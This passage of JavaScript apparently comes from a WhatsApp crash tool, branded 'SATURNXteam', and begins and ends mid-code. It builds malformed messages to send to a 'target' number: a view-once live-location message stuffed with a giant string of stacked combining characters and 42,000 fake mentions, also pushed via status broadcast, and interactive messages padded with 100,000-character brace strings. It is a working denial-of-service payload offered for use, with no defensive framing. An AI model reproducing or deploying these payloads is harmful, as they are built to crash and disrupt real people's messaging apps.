ྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུ".repeat(10000);
    let message = {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                    caption: 'SaturnXgacor\nྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱཱཱཱཱཱཱྀིཻཻིིིུུུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུ' + "@1".repeat(33333),
                    url: `HTTP://WA.ME/STICKERPACK/anjeng-settings`,                    
                   sequenceNumber: '1678556734042001',
                    jpegThumbnail: null,
                    expiration: 7776000,
                    ephemeralSettingTimestamp: '1677306667',
                    disappearingMode: {
                        initiator: 'INITIATED_BY_ME',
                        inviteLinkGroupTypeV2: 'DEFAULT',
                        messageContextInfo: {
                            deviceListMetadata: {
                                senderTimestamp: '1678285396',
                                recipientKeyHash: 'SV5H7wGIOXqPtg==',
                                recipientTimestamp: '1678496731',
                                deviceListMetadataVersion: 2
                            },
                        },
                    },
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from(
                            {
                                length: 42000,
                            },
                            () =>
                                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                    ],
                },
            },
        },
    };

    const msg = generateWAMessageFromContent(target, message, {});
    
    await skid.relayMessage(target, msg.message, {
        messageId: msg.key.id
    });

    await skid.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}
async function DocFC(skid, target) {
  for (let r = 0; r < 4; r++) {
    try {
      let msg = await generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "SATURNXteam",
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 999999999,
                    degreesLongitude: -999999999,
                    name: '{'.repeat(100000),
                    address: '{'.repeat(100000),
                  },
                },
                contextInfo: {
                  participant: "0@s.whatsapp.net",
                  remoteJid: "X",
                  mentionedJid: ["0@s.whatsapp.net"]
                },
                body: {
                  text: "SATURNXteam",
                },
                nativeFlowMessage: {
                  messageParamsJson: '{'.repeat(100000),
                },
              },
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
